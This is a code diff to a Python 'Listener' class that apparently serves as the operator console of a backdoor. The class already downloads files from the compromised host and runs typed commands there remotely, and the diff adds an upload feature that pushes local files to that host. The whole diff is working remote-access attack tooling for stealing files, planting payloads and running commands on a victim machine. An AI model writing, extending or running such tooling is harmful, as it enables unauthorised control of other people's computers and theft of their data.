@@ -37,6 +37,10 @@ class Listener:
             file.write(contents)
         return '[+] Download successful'
 
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return file.read()
+
     def receive_file(self, path):
         with open(path, "wb") as file:
             while True:
@@ -50,13 +54,19 @@ class Listener:
     def run(self):
         while True:
             command = input(">> ").split(" ")
-
             # Handle download command separately
             if command[0] == "download":
                 file_path = command[1]
                 self.reliable_send(command)  # Inform backdoor to send file
                 self.receive_file(file_path)  # Receive the file
                 print("[+] File downloaded successfully")
+            elif command[0] == "upload":
+                file_path = command[1]
+                file_content = self.read_file(file_path)
+                self.reliable_send(command)
+                self.connection.sendall(file_content)
+                self.connection.sendall(b"DONE")
+                print("[+] File uploaded successfully")
             else:
                 result = self.execute_remotely(command)
                 print(result)
